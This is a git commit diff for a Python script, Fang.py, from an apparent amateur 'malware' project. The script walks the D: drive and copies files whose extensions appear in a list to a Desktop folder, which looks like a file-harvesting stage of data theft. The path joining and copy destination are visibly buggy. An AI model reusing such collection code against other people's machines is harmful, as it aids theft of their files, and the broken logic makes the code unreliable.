d3645da27263282e64d49e1493762711c2836212
C4piti44 <97689075+C4piti44@users.noreply.github.com>
2022-01-25 23:08:39 +0200

    Update Fang.py
    there are another problems but OK

--- Fang.py
+++ Fang.py
@@ -1,13 +1,14 @@
 import shutil
 from malware import*
 import os
-the_dir = r'E:\\';
+target = r"E:\the meat"
 for dirpath , dirname , filenames in os.walk(r'D:\\'):
         for file in filenames:
+            full_dir = dirpath+file
             if file.endswith(tuple(ex_list)):
                 try:
-                    shutil.copyfile(dirpath , r'C:\Users\USER\Desktop\beef')
-                except FileNotFoundError :
+                    shutil.copyfile(full_dir, r'C:\Users\USER\Desktop\beef')
+                except FileNotFoundError:
                     pass
 
 
